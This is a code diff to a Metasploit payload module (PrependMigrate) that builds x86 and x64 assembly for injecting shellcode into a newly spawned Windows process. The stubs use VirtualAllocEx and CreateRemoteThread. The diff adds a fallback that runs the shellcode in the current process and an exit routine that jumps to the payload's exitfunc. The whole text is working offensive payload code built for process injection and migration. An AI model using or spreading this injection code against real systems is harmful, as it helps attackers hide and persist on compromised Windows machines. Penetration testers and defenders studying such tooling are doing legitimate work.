@@ -147,6 +147,23 @@ module Msf::Payload::Windows::PrependMigrate
 			jmp.i8 next_mod           ; Process this module
 		;--------------------------------------------------------------------------------------
 		EOS
+
+		# Prepare default exit block (sleep for a long long time)
+		exitblock = <<-EOS
+			;sleep
+			push -1
+			push 0xE035F044           ; hash( "kernel32.dll", "Sleep" )
+			call ebp                  ; Sleep( ... );
+		EOS
+
+		# Check to see if we can find exitfunc in the payload
+		exitfunc_index = buf.index("\x68\xA6\x95\xBD\x9D\xFF\xD5\x3C\x06\x7C\x0A" +
+						"\x80\xFB\xE0\x75\x05\xBB\x47\x13\x72\x6F\x6A\x00\x53\xFF\xD5")
+		if exitfunc_index
+			exitblock_offset = "0x%04x + payload - exitblock" % (exitfunc_index - 5)
+			exitblock = "exitblock:\njmp $+#{exitblock_offset}"
+		end
+
 		block_api_ebp_asm = <<-EOS
 			pop ebp                   ; Pop off the address of 'api_call' for calling later.
 		EOS
@@ -213,9 +230,7 @@ module Msf::Payload::Windows::PrependMigrate
 
 			; if we didn't get a new process, use this one
 			test eax,eax
-			jnz goodProcess           ; Skip this next block if we got a new process
-			dec eax
-			mov [edi], eax            ; handle = NtCurrentProcess()
+			jz payload                ; If process creation failed, jump to shellcode
 
 		goodProcess:
 			; allocate memory in the process (VirtualAllocEx())
@@ -254,10 +269,7 @@ module Msf::Payload::Windows::PrependMigrate
 			push 0x799AACC6           ; hash( "kernel32.dll", "CreateRemoteThread" )
 			call ebp                  ; CreateRemoteThread( ...);
 
-			;sleep
-			push -1
-			push 0xE035F044           ; hash( "kernel32.dll", "Sleep" )
-			call ebp                  ; Sleep( ... );
+			#{exitblock}              ; jmp to exitfunc or long sleep
 
 		getcommand:
 			call gotcommand
@@ -266,6 +278,7 @@ module Msf::Payload::Windows::PrependMigrate
 		#{block_close_to_payload}
 		begin_of_payload:
 			call begin_of_payload_return
+		payload:
 		EOS
 		migrate_asm
 	end
@@ -369,6 +382,24 @@ module Msf::Payload::Windows::PrependMigrate
 			mov rdx, [rdx]           ; Get the next module
 			jmp next_mod             ; Process this module
 		EOS
+
+		# Prepare default exit block (sleep for a long long time)
+		exitblock = <<-EOS
+			;sleep
+			xor rcx,rcx
+			dec rcx                   ; rcx = -1
+			mov r10d, 0xE035F044      ; hash( "kernel32.dll", "Sleep" )
+			call rbp                  ; Sleep( ... );
+		EOS
+
+		# Check to see if we can find x64 exitfunc in the payload
+		exitfunc_index = buf.index("\x41\xBA\xA6\x95\xBD\x9D\xFF\xD5\x48\x83\xC4\x28\x3C\x06" +
+				"\x7C\x0A\x80\xFB\xE0\x75\x05\xBB\x47\x13\x72\x6F\x6A\x00\x59\x41\x89\xDA\xFF\xD5")
+		if exitfunc_index
+			exitblock_offset = "0x%04x + payload - exitblock" % (exitfunc_index - 5)
+			exitblock = "exitblock:\njmp $+#{exitblock_offset}"
+		end
+
 		block_api_rbp_asm = <<-EOS
 			pop rbp                   ; Pop off the address of 'api_call' for calling later.
 		EOS
@@ -432,9 +463,7 @@ module Msf::Payload::Windows::PrependMigrate
 
 			; if we didn't get a new process, use this one
 			test rax,rax
-			jnz goodProcess           ; Skip this next block if we got a new process
-			dec rax
-			mov [rdi], rax            ; handle = NtCurrentProcess()
+			jz payload                ; If process creation failed, jump to shellcode
 
 		goodProcess:
 			; allocate memory in the process (VirtualAllocEx())
@@ -473,11 +502,7 @@ module Msf::Payload::Windows::PrependMigrate
 			mov r10d, 0x799AACC6      ; hash( "kernel32.dll", "CreateRemoteThread" )
 			call rbp                  ; CreateRemoteThread( ...);
 
-			;sleep
-			xor rcx,rcx
-			dec rcx                   ; rcx = -1
-			mov r10d, 0xE035F044      ; hash( "kernel32.dll", "Sleep" )
-			call rbp                  ; Sleep( ... );
+			#{exitblock}              ; jmp to exitfunc or long sleep
 
 		getcommand:
 			call gotcommand
@@ -486,6 +511,7 @@ module Msf::Payload::Windows::PrependMigrate
 		#{block_close_to_payload}
 		begin_of_payload:
 			call begin_of_payload_return
+		payload:
 		EOS
 		migrate_asm
 	end
